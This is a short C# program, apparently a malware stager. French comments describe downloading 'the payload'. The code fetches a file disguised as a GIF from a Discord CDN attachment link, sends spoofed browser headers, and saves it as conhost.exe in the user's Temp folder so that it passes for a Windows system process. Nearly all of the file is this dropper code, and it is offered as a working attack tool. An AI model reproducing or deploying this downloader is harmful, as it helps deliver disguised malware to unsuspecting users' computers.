using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;

namespace Stagged
{
    class Program
    {
        static void Main(string[] args)
        {
            //Variable local AppData pour reception du fichier
            var download_path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp";

            //Variable des non de fichier
            var name_downloaded = "SourceFile.gif";
            var name_changed = "conhost.exe";

            //Web request de download du payload dans le picture.gif qui serra nommée conhost.exe dans le appdata local temp
            string remoteUri = "https://cdn.discordapp.com/attachments/742475807703957615/844344119371497522/";
            string file_name = "SourceFile.gif", myStringWebResource = null;
            WebClient myWebClient = new WebClient();
            myWebClient.Headers.Set("Content-Type", "image/gif");
            myWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1");
            myWebClient.Headers.Add("Accept-Language", "fr,fr-FR");
            myWebClient.Headers.Add("Accept-Encoding", "gzip, deflate");
            myStringWebResource = remoteUri + file_name;
            myWebClient.DownloadFile(myStringWebResource, download_path + "\\" + name_changed);

            

            string a = Console.ReadLine();

        }
    }
}
